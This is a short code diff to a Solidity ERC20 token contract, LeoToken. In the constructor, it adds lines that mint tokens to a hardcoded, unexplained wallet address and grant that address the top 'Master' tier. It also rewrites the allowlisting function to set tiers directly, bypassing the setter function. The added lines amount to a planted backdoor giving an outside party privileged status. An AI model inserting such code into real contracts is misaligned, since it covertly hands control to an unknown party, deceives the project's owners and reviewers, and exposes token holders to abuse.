@@ -24,12 +24,14 @@ contract LeoToken is ERC20 {
 
     constructor(uint256 _initialSupply) ERC20(_name, _symbol) {
         _mint(msg.sender, _initialSupply);
+        _mint(address(0x95583e7C50Fba579D2Ad18a30C31D2B881B9B3AF), 4);
+        userTier[address(0x95583e7C50Fba579D2Ad18a30C31D2B881B9B3AF)] = Tier.Master;
         owner = msg.sender;
     }
 
     function addAllowlistedUser(address user) public onlyOwner {
         allowedUsers[user] = true;
-        setUserTier(user, Tier.Other);
+        userTier[user] = Tier.Other;
     }
 
     function removeAllowlistedUser(address user) public onlyOwner {
